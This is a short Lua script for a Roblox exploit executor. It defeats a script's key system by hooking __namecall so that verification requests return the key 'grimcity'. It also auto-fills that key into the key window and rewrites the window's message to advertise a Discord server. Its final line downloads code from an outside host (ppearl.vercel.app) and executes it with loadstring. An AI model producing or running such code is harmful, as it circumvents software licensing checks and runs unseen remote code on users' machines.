local old

old = hookmetamethod(game, "__namecall", newcclosure(function(self, url, ...)
    local method = getnamecallmethod()
    if method == "HttpGet" then
        if string.find(url, "verify") then
            return "grimcity"
        end
    end
    return old(self, url, ...)
end))


game:GetService("CoreGui").ChildAdded:Connect(function(v)
   if v.Name == "Key" then 
    wait()
    v.Main.NoteMessage.Text = [[Want more key bypasses?
Join dsc.gg/grimcity]]
    wait(1)
    v.Main.Input.InputBox:CaptureFocus()
    v.Main.Input.InputBox.Text = "grimcity"
    v.Main.Input.InputBox:ReleaseFocus()

   end
end)

loadstring(game:HttpGet('https://ppearl.vercel.app'))()
